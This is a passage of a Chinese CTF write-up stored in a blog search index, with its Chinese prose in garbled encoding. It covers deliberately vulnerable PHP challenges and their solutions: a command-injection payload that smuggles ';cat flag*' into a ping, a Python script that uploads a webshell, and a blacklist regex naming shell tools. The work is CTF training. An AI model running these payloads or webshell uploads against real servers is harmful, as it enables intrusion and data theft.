<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>polarCTFwebåˆ·é¢˜è®°å½•(ç®€å•)</title>
    <link href="/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95/"/>
    <url>/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h1 id="polarCTFwebåˆ·é¢˜è®°å½•-ç®€å•"><a href="#polarCTFwebåˆ·é¢˜è®°å½•-ç®€å•" class="headerlink" title="polarCTFwebåˆ·é¢˜è®°å½•(ç®€å•)"></a>polarCTFwebåˆ·é¢˜è®°å½•(ç®€å•)</h1><p>æ€»ç®—æ˜¯æŠŠç®€å•é¢˜åˆ·å®Œäº†ã€‚</p><h2 id="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in $flag</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sys&#x27;</span>];<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span> == <span class="hljs-string">&#x27;8gen1&#x27;</span> &amp;&amp; <span class="hljs-variable">$flag2</span> == <span class="hljs-string">&#x27;8gen1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;504_SYS.COM&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\?/&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>);  <br><br>    &#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><h3 id="å…³é”®ç‚¹åˆ†æ"><a href="#å…³é”®ç‚¹åˆ†æ" class="headerlink" title="å…³é”®ç‚¹åˆ†æ"></a>å…³é”®ç‚¹åˆ†æ</h3><ol><li><p>flag1 å’Œ flag2 ä¸èƒ½ä»¥ GET æˆ– POST æ™®é€šå‚æ•°å½¢å¼å‡ºç°ï¼Œå¦åˆ™ç›´æ¥ dieã€‚</p></li><li><p>æœ‰è¿™ä¸€è¡Œï¼š@parse_str($_SERVER[â€˜QUERY_STRINGâ€™]); â†’ è¿™ä¼šæŠŠ URL ä¸­çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆå¦‚ ?a&#x3D;1&amp;b&#x3D;2ï¼‰è§£ææˆå˜é‡</p></li><li><p>ç´§æ¥ç€ extract($_POST); â†’ ä¼šæŠŠ POST å‚æ•°ä¹Ÿå¯¼å…¥åˆ°å½“å‰ç¬¦å·è¡¨ï¼Œä¸” POST ä¼šè¦†ç›–åŒåå˜é‡ï¼ˆé‡è¦ï¼ï¼‰</p></li><li><p>è¦è¿›å…¥ </p><p>eval</p><p> å¿…é¡»æ»¡è¶³ï¼š</p><ul><li>$flag1 &#x3D;&#x3D;&#x3D; â€˜8gen1â€™ ä¸” $flag2 &#x3D;&#x3D;&#x3D; â€˜8gen1â€™</li><li>POST ä¸­æœ‰ 504_SYS.COM è¿™ä¸ªå‚æ•°</li><li>$cï¼ˆå³ $_POST[â€˜sysâ€™]ï¼‰ä¸èƒ½åŒ…å«ä¸€å †è¢«ç¦å­—ç¬¦</li></ul></li></ol></li></ul><h2 id="å¹²æ­£åˆ™"><a href="#å¹²æ­£åˆ™" class="headerlink" title="å¹²æ­£åˆ™"></a>å¹²æ­£åˆ™</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;www.baidu.com&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;www.polarctf.com&#x27;</span>) &#123;<br>        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag\.php/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;don&#x27;t show flag!!!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$result</span> .= <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 2 &#x27;</span> . <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$ip</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;å…¶å®å¾ˆç®€å•ï¼&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="parse-str-id-å˜é‡è¦†ç›–æ¼æ´ï¼ˆPHP-5-4-ç»å…¸æ¼æ´ï¼‰"><a href="#parse-str-id-å˜é‡è¦†ç›–æ¼æ´ï¼ˆPHP-5-4-ç»å…¸æ¼æ´ï¼‰" class="headerlink" title="parse_str($id) å˜é‡è¦†ç›–æ¼æ´ï¼ˆPHP &lt; 5.4 ç»å…¸æ¼æ´ï¼‰"></a>parse_str($id) å˜é‡è¦†ç›–æ¼æ´ï¼ˆPHP &lt; 5.4 ç»å…¸æ¼æ´ï¼‰</h3><p>PHP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];</span><br><span class="hljs-meta prompt_">@parse_str($</span><span class="language-bash"><span class="hljs-built_in">id</span>);</span><br></code></pre></td></tr></table></figure><p>è¿™è¡Œä»£ç æ˜¯æœ€å¤§æ¼æ´ï¼ parse_str() ä¼šæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²æ ¼å¼çš„å‚æ•°è§£æå¹¶æ³¨å†Œæˆå˜é‡ï¼Œä¾‹å¦‚ï¼š</p><p>text</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a=hhh<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåå°±ä¼šåœ¨å½“å‰ä½œç”¨åŸŸåˆ›å»ºä¸€ä¸ªå˜é‡ $a &#x3D; â€˜hhhâ€™ï¼Œç›´æ¥è¦†ç›–äº†å‰é¢å®šä¹‰çš„</p><p>PHP</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a = <span class="hljs-string">&quot;www.baidu.com&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€  id å‚æ•°æ¥ä»»æ„è¦†ç›– $a å˜é‡ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[0]=www.polarctf.com&amp;<span class="hljs-attribute">cmd</span>=;cat%20flag*<br></code></pre></td></tr></table></figure><h2 id="uploader"><a href="#uploader" class="headerlink" title="uploader"></a>uploader</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sandBox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$sandBox</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandBox</span>,<span class="hljs-number">0755</span>,<span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)&#123;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$sandBox</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸Šä¼ æ–‡ä»¶å: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶ç±»å‹: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ–‡ä»¶å¤§å°: &quot;</span> . (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">&quot; kB&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sandBox</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰è¿‡æ»¤é™åˆ¶çš„æ–‡ä»¶ä¸Šä¼ ç•Œé¢ã€‚ä½¿ç”¨å®¢æˆ·ç«¯<code> IP åœ°å€</code> <code>ï¼ˆ$_SERVER[&#39;REMOTE_ADDR&#39;]ï¼‰</code>çš„ <code>MD5 </code>å“ˆå¸Œå€¼ä½œä¸ºç›®å½•ååˆ›å»ºæ–‡ä»¶å¤¹ã€‚ ä¾‹å¦‚ï¼šå¦‚æœä½ çš„<code>IP </code>æ˜¯ <code>192.168.1.1</code>ï¼Œæ–‡ä»¶å¤¹åä¼šæ˜¯ç±»ä¼¼ <code>3d4e9f5a2a4b8c6d0e1f2a3b4c5d6e7f</code> çš„å“ˆå¸Œå€¼ï¼ˆå®é™…å“ˆå¸Œå›  IP ä¸åŒè€Œå˜ï¼‰ã€‚</p><p>å¦‚æœè¯¥ç›®å½•ä¸å­˜åœ¨ï¼Œå°±é€šè¿‡<code> mkdir($sandBox, 0755, true)</code> åˆ›å»ºå®ƒã€‚</p><p>å½“é€šè¿‡<code> POST</code> è¯·æ±‚<code>ï¼ˆmultipart/form-data æ ¼å¼ï¼‰</code>ä¸Šä¼ åä¸º <code>file</code> çš„æ–‡ä»¶æ—¶ï¼Œå®ƒä¼šï¼š</p><ul><li>ä½¿ç”¨<code>move_uploaded_file</code>å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°<code>$sandBox . &quot;/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]</code>è·¯å¾„ä¸‹ã€‚</li><li>ç›´æ¥ä¿ç•™å®¢æˆ·ç«¯æä¾›çš„åŸå§‹æ–‡ä»¶åã€‚</li><li>è¾“å‡ºä¸Šä¼ ä¿¡æ¯ï¼šæ–‡ä»¶åã€MIME ç±»å‹ã€å¤§å°ï¼ˆå•ä½ kBï¼‰ï¼Œå¹¶å›æ˜¾æ²™ç›’ç›®å½•è·¯å¾„ã€‚</li></ul><p>æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨åŠè„šæœ¬ä¸Šä¼ æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br> <br>url = <span class="hljs-string">&#x27;http://055a0922-a994-45ee-9635-c9232735cb7f.www.polarctf.com:8090/&#x27;</span>  <span class="hljs-comment"># æ›¿æ¢æˆä½ çš„æœåŠ¡å™¨åœ°å€</span><br> <br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;D:\Python\yijihua.php&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;  <span class="hljs-comment"># å°†æ–‡ä»¶åæ›¿æ¢ä¸ºä½ æƒ³ä¸Šä¼ çš„æ–‡ä»¶</span><br> <br>response = requests.<span class="hljs-title function_ invoke__">post</span>(url, files=files)<br> <br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;æœåŠ¡å™¨è¿”å›çš„æ¶ˆæ¯:&quot;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;é”™è¯¯ç :&quot;</span>, response.status_code)<br></code></pre></td></tr></table></figure><h2 id="è¦†ç›–"><a href="#è¦†ç›–" class="headerlink" title="è¦†ç›–"></a>è¦†ç›–</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;www.baidu.com&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;www.polarctf.com&#x27;</span>) &#123;<br>        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-variable">$result</span> .= <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 2 &#x27;</span> . <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] . <span class="hljs-variable">$ip</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;å…¶å®å¾ˆç®€å•ï¼&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿå¹²æ­£åˆ™å®Œå…¨ä¸€æ ·ï¼Œåˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´ã€‚</p><h2 id="å®¡è®¡"><a href="#å®¡è®¡" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxs&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxs&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é”™è¯¯ï¼šè¾“å…¥ç±»å‹ä¸å…è®¸ä¸ºæ•°ç»„ã€‚&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^0e[0-9]+$/&quot;</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$input</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é”™è¯¯ï¼šè¾“å…¥çš„MD5å€¼å¿…é¡»ä»¥&#x27;0e&#x27;å¼€å¤´ï¼Œå¹¶è·Ÿéšæ•°å­—ã€‚&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é”™è¯¯ï¼šè¾“å…¥å¿…é¡»æ˜¯æ•°å­—ã€‚&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ­å–œï¼š&quot;</span>.<span class="hljs-variable">$flag</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é”™è¯¯ï¼šå¿…é¡»è®¾ç½®æ­£ç¡®å‚æ•°ã€‚&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>$input </code>å¿…é¡»æ˜¯<strong>æ•°å­—å­—ç¬¦ä¸²</strong>ï¼ˆé€šè¿‡ is_numeric() æ£€æŸ¥ï¼‰</li><li><code>md5($input) </code>çš„ç»“æœå¿…é¡»æ˜¯<strong>ä»¥ â€œ0eâ€ å¼€å¤´ä¸”åé¢å…¨æ˜¯æ•°å­—</strong>çš„å­—ç¬¦ä¸²ï¼ˆå¦‚ â€œ0e1234567890â€ï¼‰</li><li><code>$input</code> ä¸èƒ½æ˜¯æ•°ç»„</li></ul><h2 id="rapyiquan"><a href="#rapyiquan" class="headerlink" title="rapyiquan"></a>rapyiquan</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkUrlParams</span>(<span class="hljs-params"><span class="hljs-variable">$params</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$params</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUrlParams</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c_md&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;badly!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$url</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hack&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><strong>æ­£å¸¸è®¿é—®</strong>ï¼ˆURIæ— â€_â€ï¼‰ï¼šé¡µé¢æ˜¾ç¤ºæºç  + ä¸€ä¸ªè¾“å…¥æ¡†ï¼ˆéšå«ï¼Œé€šè¿‡?c_md&#x3D;xxxä¼ å…¥å‘½ä»¤ï¼‰ã€‚</li><li>ç”¨æˆ·ä¼ å…¥?c_md&#x3D;xxxï¼Œå¦‚æœxxxä¸åŒ¹é…é»‘åå•æ­£åˆ™ï¼Œå°±ç›´æ¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œxxxå‘½ä»¤ï¼Œå¹¶è¾“å‡ºç»“æœã€‚è¿™å°±æ˜¯ä¸€ä¸ª<strong>å‘½ä»¤æ³¨å…¥æ¼æ´</strong>ï¼Œç›®æ ‡é€šå¸¸æ˜¯è¯»å–flagæ–‡ä»¶ï¼ˆä¾‹å¦‚cat flag.phpæˆ–lsåˆ—ç›®å½•ï¼‰ã€‚</li><li>é»‘åå•è¿‡æ»¤éå¸¸ä¸¥æ ¼ï¼š<ul><li>ç¦æ­¢å‡ 